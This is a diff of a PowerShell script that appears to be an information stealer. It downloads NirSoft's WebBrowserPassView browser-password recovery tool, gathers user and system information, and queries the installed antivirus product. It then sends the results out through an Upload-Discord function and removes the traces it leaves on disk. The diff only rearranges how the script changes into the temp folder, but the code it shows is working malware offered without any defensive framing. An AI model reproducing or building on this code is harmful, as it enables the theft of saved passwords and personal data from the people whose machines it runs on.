@@ -1,6 +1,6 @@
 $desktop = ([Environment]::GetFolderPath("Desktop"))
 function Get-Nirsoft {
-
+  cd C:\
   mkdir \temp 
   cd \temp
   Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
@@ -12,9 +12,7 @@ function Get-Nirsoft {
 
 function SysInfo {
 #Making sure that my path is on C:\ and creating a \temp folder, then go inside that folder to execute everything
-cd C:\
-mkdir \temp
-cd \temp
+cd C:\temp
 
 #1. Get User Informations
 # Get the date at the selected format
@@ -91,9 +89,7 @@ Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 }
 
 function version-av {
-  mkdir \temp 
-  cd \temp
+  cd C:\temp
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
   Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
-  cd C:\
 }
